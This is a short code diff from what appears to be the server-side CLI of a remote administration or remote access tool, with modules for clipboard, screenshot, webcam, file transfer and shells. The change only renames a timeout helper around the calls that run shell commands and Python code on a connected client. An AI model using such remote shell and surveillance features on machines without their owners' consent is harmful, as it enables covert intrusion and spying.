@@ -8,7 +8,7 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, filetransfer, screenshot, shells, tasks, webcam, windows
 from modules.baseserver import BaseServer
 from utils import terminal
-from utils.timeout_handler import TimeoutSetter
+from utils.timeout_handler import timeoutsetter
 
 # Enables using arrowkeys on unix-like systems
 with suppress(ImportError):
@@ -154,7 +154,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
                 # TODO: update cwd accordingly
 
             # Increase timeout for shell
-            with TimeoutSetter(self.client, 60):
+            with timeoutsetter(self.client, 60):
                 try:
                     print(shells.shell(self.client, command), end='')
                 except TimeoutError:
@@ -177,7 +177,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
                 break
 
             # Increase timeout for interpreter
-            with TimeoutSetter(self.client, 60):
+            with timeoutsetter(self.client, 60):
                 try:
                     print(shells.python(self.client, command), end='')
                 except TimeoutError:
